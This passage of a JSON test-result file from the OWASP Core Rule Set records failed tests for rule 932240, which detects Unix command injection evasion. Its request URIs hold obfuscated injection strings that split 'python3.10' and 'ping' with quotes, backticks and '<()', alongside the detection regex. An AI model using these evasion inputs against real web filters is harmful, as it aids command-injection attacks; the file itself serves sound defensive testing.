          "text" : "       - excluded words: known user-agents)"
        }, {
          "type" : "Comment",
          "text" : "  ..932238 (stricter sibling of 932236, PL3,"
        }, {
          "type" : "Comment",
          "text" : "       - no excluded words)"
        }, {
          "type" : "Comment",
          "text" : "  .932237 (stricter sibling of 932230, 932235, 932250, 932260, PL3,"
        }, {
          "type" : "Comment",
          "text" : "       - targets request headers user-agent and referer only"
        }, {
          "type" : "Comment",
          "text" : "       - without prefix"
        }, {
          "type" : "Comment",
          "text" : "       - with word boundaries"
        }, {
          "type" : "Comment",
          "text" : "       - words of any length"
        }, {
          "type" : "Comment",
          "text" : "       - excluded words: known user-agents)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932240.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932240"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)[\\-0-9_a-z]+(?:[\\s\\x0b]*[\\\"'][^\\s\\x0b\\\"',:]+[\\\"']|(?:[\\\"'][\\\"']+|[\\[-\\]]+|\\$+[!#\\*\\-0-9\\?@\\x5c_a-\\{]+|``|[\\$<>]\\(\\))[\\s\\x0b]*)[\\-0-9_a-z]+"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932240
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Unix Command Injection evasion attempt detected"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{TX.932240_MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-unix"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/2"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.932240_matched_var_name=%{matched_var_name}"
        }, {
          "type" : "Action",
          "action_type" : "chain"
        } ]
      }
    }
  }, {
    "test_rule" : "932240",
    "test_id" : 9,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932240.yaml",
    "description" : "Unix Command Injection - python version bypass test",
    "cause" : "failed expect_id check: 932240 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ ]
    },
    "test" : {
      "test_id" : 9,
      "desc" : "Unix Command Injection - python version bypass test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?cmd=\"\"p\"\"y\"\"t\"\"h\"\"o\"\"n\"\"3\"\".\"\"1\"\"0\"\"%20\"\"c\"\"m\"\"d\"\"",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932240 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932240,
      "phase" : 2,
      "chain" : true,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " -=[ Rule 932240 ]=-"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Generic RCE Bypass blocking using different techniques: see https://github.com/coreruleset/coreruleset/issues/2632"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule complements rule 932230 with generic evasion detection."
        }, {
          "type" : "Comment",
          "text" : " Anything that uses a well-known evasion technique should be blocked at this level."
        }, {
          "type" : "Comment",
          "text" : " The chained rule will exclude false positives due to german thousands separators (e.g., 10'000)."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Rule relations:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "  .932230 (base rule, PL1, targets prefix + two and three character commands)"
        }, {
          "type" : "Comment",
          "text" : "  ..932231 (stricter sibling, PL2, targets prefix + the source shortcut command)"
        }, {
          "type" : "Comment",
          "text" : "  ..932232 (stricter sibling, PL3, targets prefix + additional command words)"
        }, {
          "type" : "Comment",
          "text" : "  .932235 (base rule, PL1, targets prefix + known command word of length > 3 without evasion)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "  .932250 (base rule, PL1, targets two and three character commands)"
        }, {
          "type" : "Comment",
          "text" : "  .932260 (base rule, PL1, targets known command word of length > 3 without evasion)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "  .932240 (generic detection, PL2, targets generic evasion attempts)"
        }, {
          "type" : "Comment",
          "text" : "  .932236 (stricter sibling of 932230, 932235, 932250, 932260, PL2,"
        }, {
          "type" : "Comment",
          "text" : "       - with and without prefix"
        }, {
          "type" : "Comment",
          "text" : "       - words of any length)"
        }, {
          "type" : "Comment",
          "text" : "  ..932239 (sibling of 932236, PL2,"
        }, {
          "type" : "Comment",
          "text" : "       - with and without prefix"
        }, {
          "type" : "Comment",
          "text" : "       - words of any length"
        }, {
          "type" : "Comment",
          "text" : "       - targets request headers user-agent and referer only"
        }, {
          "type" : "Comment",
          "text" : "       - excluded words: known user-agents)"
        }, {
          "type" : "Comment",
          "text" : "  ..932238 (stricter sibling of 932236, PL3,"
        }, {
          "type" : "Comment",
          "text" : "       - no excluded words)"
        }, {
          "type" : "Comment",
          "text" : "  .932237 (stricter sibling of 932230, 932235, 932250, 932260, PL3,"
        }, {
          "type" : "Comment",
          "text" : "       - targets request headers user-agent and referer only"
        }, {
          "type" : "Comment",
          "text" : "       - without prefix"
        }, {
          "type" : "Comment",
          "text" : "       - with word boundaries"
        }, {
          "type" : "Comment",
          "text" : "       - words of any length"
        }, {
          "type" : "Comment",
          "text" : "       - excluded words: known user-agents)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932240.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932240"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)[\\-0-9_a-z]+(?:[\\s\\x0b]*[\\\"'][^\\s\\x0b\\\"',:]+[\\\"']|(?:[\\\"'][\\\"']+|[\\[-\\]]+|\\$+[!#\\*\\-0-9\\?@\\x5c_a-\\{]+|``|[\\$<>]\\(\\))[\\s\\x0b]*)[\\-0-9_a-z]+"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932240
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Unix Command Injection evasion attempt detected"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{TX.932240_MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-unix"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/2"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.932240_matched_var_name=%{matched_var_name}"
        }, {
          "type" : "Action",
          "action_type" : "chain"
        } ]
      }
    }
  }, {
    "test_rule" : "932240",
    "test_id" : 10,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932240.yaml",
    "description" : "Backticks command subtition WAF evasion",
    "cause" : "failed expect_id check: 932240 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ ]
    },
    "test" : {
      "test_id" : 10,
      "desc" : "Backticks command subtition WAF evasion",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "method" : "GET",
          "port" : 80,
          "headers" : {
            "User-Agent" : "OWASP CRS test agent",
            "Host" : "localhost",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "uri" : "/get?x=ping``%20127.0.0.1",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932240 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932240,
      "phase" : 2,
      "chain" : true,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " -=[ Rule 932240 ]=-"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Generic RCE Bypass blocking using different techniques: see https://github.com/coreruleset/coreruleset/issues/2632"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule complements rule 932230 with generic evasion detection."
        }, {
          "type" : "Comment",
          "text" : " Anything that uses a well-known evasion technique should be blocked at this level."
        }, {
          "type" : "Comment",
          "text" : " The chained rule will exclude false positives due to german thousands separators (e.g., 10'000)."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Rule relations:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "  .932230 (base rule, PL1, targets prefix + two and three character commands)"
        }, {
          "type" : "Comment",
          "text" : "  ..932231 (stricter sibling, PL2, targets prefix + the source shortcut command)"
        }, {
          "type" : "Comment",
          "text" : "  ..932232 (stricter sibling, PL3, targets prefix + additional command words)"
        }, {
          "type" : "Comment",
          "text" : "  .932235 (base rule, PL1, targets prefix + known command word of length > 3 without evasion)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "  .932250 (base rule, PL1, targets two and three character commands)"
        }, {
          "type" : "Comment",
          "text" : "  .932260 (base rule, PL1, targets known command word of length > 3 without evasion)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "  .932240 (generic detection, PL2, targets generic evasion attempts)"
        }, {
          "type" : "Comment",
          "text" : "  .932236 (stricter sibling of 932230, 932235, 932250, 932260, PL2,"
        }, {
          "type" : "Comment",
          "text" : "       - with and without prefix"
        }, {
          "type" : "Comment",
          "text" : "       - words of any length)"
        }, {
          "type" : "Comment",
          "text" : "  ..932239 (sibling of 932236, PL2,"
        }, {
          "type" : "Comment",
          "text" : "       - with and without prefix"
        }, {
          "type" : "Comment",
          "text" : "       - words of any length"
        }, {
          "type" : "Comment",
          "text" : "       - targets request headers user-agent and referer only"
        }, {
          "type" : "Comment",
          "text" : "       - excluded words: known user-agents)"
        }, {
          "type" : "Comment",
          "text" : "  ..932238 (stricter sibling of 932236, PL3,"
        }, {
          "type" : "Comment",
          "text" : "       - no excluded words)"
        }, {
          "type" : "Comment",
          "text" : "  .932237 (stricter sibling of 932230, 932235, 932250, 932260, PL3,"
        }, {
          "type" : "Comment",
          "text" : "       - targets request headers user-agent and referer only"
        }, {
          "type" : "Comment",
          "text" : "       - without prefix"
        }, {
          "type" : "Comment",
          "text" : "       - with word boundaries"
        }, {
          "type" : "Comment",
          "text" : "       - words of any length"
        }, {
          "type" : "Comment",
          "text" : "       - excluded words: known user-agents)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932240.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932240"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)[\\-0-9_a-z]+(?:[\\s\\x0b]*[\\\"'][^\\s\\x0b\\\"',:]+[\\\"']|(?:[\\\"'][\\\"']+|[\\[-\\]]+|\\$+[!#\\*\\-0-9\\?@\\x5c_a-\\{]+|``|[\\$<>]\\(\\))[\\s\\x0b]*)[\\-0-9_a-z]+"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932240
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Unix Command Injection evasion attempt detected"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{TX.932240_MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-unix"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/2"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.932240_matched_var_name=%{matched_var_name}"
        }, {
          "type" : "Action",
          "action_type" : "chain"
        } ]
      }
    }
  }, {
    "test_rule" : "932240",
    "test_id" : 11,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932240.yaml",
    "description" : "Backticks command subtition WAF evasion (mid command)",
    "cause" : "failed expect_id check: 932240 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ ]
    },
    "test" : {
      "test_id" : 11,
      "desc" : "Backticks command subtition WAF evasion (mid command)",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "method" : "GET",
          "port" : 80,
          "headers" : {
            "User-Agent" : "OWASP CRS test agent",
            "Host" : "localhost",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "uri" : "/get?x=pi``ng%20127.0.0.1",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932240 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932240,
      "phase" : 2,
      "chain" : true,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " -=[ Rule 932240 ]=-"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Generic RCE Bypass blocking using different techniques: see https://github.com/coreruleset/coreruleset/issues/2632"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule complements rule 932230 with generic evasion detection."
        }, {
          "type" : "Comment",
          "text" : " Anything that uses a well-known evasion technique should be blocked at this level."
        }, {
          "type" : "Comment",
          "text" : " The chained rule will exclude false positives due to german thousands separators (e.g., 10'000)."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Rule relations:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "  .932230 (base rule, PL1, targets prefix + two and three character commands)"
        }, {
          "type" : "Comment",
          "text" : "  ..932231 (stricter sibling, PL2, targets prefix + the source shortcut command)"
        }, {
          "type" : "Comment",
          "text" : "  ..932232 (stricter sibling, PL3, targets prefix + additional command words)"
        }, {
          "type" : "Comment",
          "text" : "  .932235 (base rule, PL1, targets prefix + known command word of length > 3 without evasion)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "  .932250 (base rule, PL1, targets two and three character commands)"
        }, {
          "type" : "Comment",
          "text" : "  .932260 (base rule, PL1, targets known command word of length > 3 without evasion)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "  .932240 (generic detection, PL2, targets generic evasion attempts)"
        }, {
          "type" : "Comment",
          "text" : "  .932236 (stricter sibling of 932230, 932235, 932250, 932260, PL2,"
        }, {
          "type" : "Comment",
          "text" : "       - with and without prefix"
        }, {
          "type" : "Comment",
          "text" : "       - words of any length)"
        }, {
          "type" : "Comment",
          "text" : "  ..932239 (sibling of 932236, PL2,"
        }, {
          "type" : "Comment",
          "text" : "       - with and without prefix"
        }, {
          "type" : "Comment",
          "text" : "       - words of any length"
        }, {
          "type" : "Comment",
          "text" : "       - targets request headers user-agent and referer only"
        }, {
          "type" : "Comment",
          "text" : "       - excluded words: known user-agents)"
        }, {
          "type" : "Comment",
          "text" : "  ..932238 (stricter sibling of 932236, PL3,"
        }, {
          "type" : "Comment",
          "text" : "       - no excluded words)"
        }, {
          "type" : "Comment",
          "text" : "  .932237 (stricter sibling of 932230, 932235, 932250, 932260, PL3,"
        }, {
          "type" : "Comment",
          "text" : "       - targets request headers user-agent and referer only"
        }, {
          "type" : "Comment",
          "text" : "       - without prefix"
        }, {
          "type" : "Comment",
          "text" : "       - with word boundaries"
        }, {
          "type" : "Comment",
          "text" : "       - words of any length"
        }, {
          "type" : "Comment",
          "text" : "       - excluded words: known user-agents)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932240.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932240"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)[\\-0-9_a-z]+(?:[\\s\\x0b]*[\\\"'][^\\s\\x0b\\\"',:]+[\\\"']|(?:[\\\"'][\\\"']+|[\\[-\\]]+|\\$+[!#\\*\\-0-9\\?@\\x5c_a-\\{]+|``|[\\$<>]\\(\\))[\\s\\x0b]*)[\\-0-9_a-z]+"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932240
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Unix Command Injection evasion attempt detected"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{TX.932240_MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-unix"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/2"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.932240_matched_var_name=%{matched_var_name}"
        }, {
          "type" : "Action",
          "action_type" : "chain"
        } ]
      }
    }
  }, {
    "test_rule" : "932240",
    "test_id" : 14,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932240.yaml",
    "description" : "Process subtition '<()' WAF evasion (mid command)",
    "cause" : "failed expect_id check: 932240 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ ]
    },
    "test" : {
      "test_id" : 14,
      "desc" : "Process subtition '<()' WAF evasion (mid command)",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "method" : "GET",
          "port" : 80,
          "headers" : {
            "User-Agent" : "OWASP CRS test agent",
            "Host" : "localhost",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "uri" : "/get?x=pi<()ng%20127.0.0.1",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932240 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932240,
      "phase" : 2,
      "chain" : true,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " -=[ Rule 932240 ]=-"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Generic RCE Bypass blocking using different techniques: see https://github.com/coreruleset/coreruleset/issues/2632"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule complements rule 932230 with generic evasion detection."
        }, {
          "type" : "Comment",
          "text" : " Anything that uses a well-known evasion technique should be blocked at this level."
        }, {
          "type" : "Comment",
          "text" : " The chained rule will exclude false positives due to german thousands separators (e.g., 10'000)."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Rule relations:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "  .932230 (base rule, PL1, targets prefix + two and three character commands)"
        }, {
          "type" : "Comment",
          "text" : "  ..932231 (stricter sibling, PL2, targets prefix + the source shortcut command)"
        }, {
          "type" : "Comment",
          "text" : "  ..932232 (stricter sibling, PL3, targets prefix + additional command words)"
        }, {
          "type" : "Comment",
          "text" : "  .932235 (base rule, PL1, targets prefix + known command word of length > 3 without evasion)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "  .932250 (base rule, PL1, targets two and three character commands)"
        }, {
          "type" : "Comment",
          "text" : "  .932260 (base rule, PL1, targets known command word of length > 3 without evasion)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "  .932240 (generic detection, PL2, targets generic evasion attempts)"
        }, {
          "type" : "Comment",
          "text" : "  .932236 (stricter sibling of 932230, 932235, 932250, 932260, PL2,"
        }, {
          "type" : "Comment",
          "text" : "       - with and without prefix"
        }, {
          "type" : "Comment",
          "text" : "       - words of any length)"
        }, {
          "type" : "Comment",
          "text" : "  ..932239 (sibling of 932236, PL2,"
        }, {
          "type" : "Comment",
          "text" : "       - with and without prefix"
        }, {
          "type" : "Comment",
          "text" : "       - words of any length"
        }, {
          "type" : "Comment",
          "text" : "       - targets request headers user-agent and referer only"
        }, {
          "type" : "Comment",
          "text" : "       - excluded words: known user-agents)"
        }, {
          "type" : "Comment",
          "text" : "  ..932238 (stricter sibling of 932236, PL3,"
        }, {
          "type" : "Comment",
          "text" : "       - no excluded words)"
        }, {
          "type" : "Comment",
          "text" : "  .932237 (stricter sibling of 932230, 932235, 932250, 932260, PL3,"
        }, {
          "type" : "Comment",
          "text" : "       - targets request headers user-agent and referer only"
        }, {
          "type" : "Comment",
          "text" : "       - without prefix"
        }, {
          "type" : "Comment",
          "text" : "       - with word boundaries"
        }, {
          "type" : "Comment",
          "text" : "       - words of any length"
        }, {
          "type" : "Comment",
          "text" : "       - excluded words: known user-agents)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932240.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932240"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
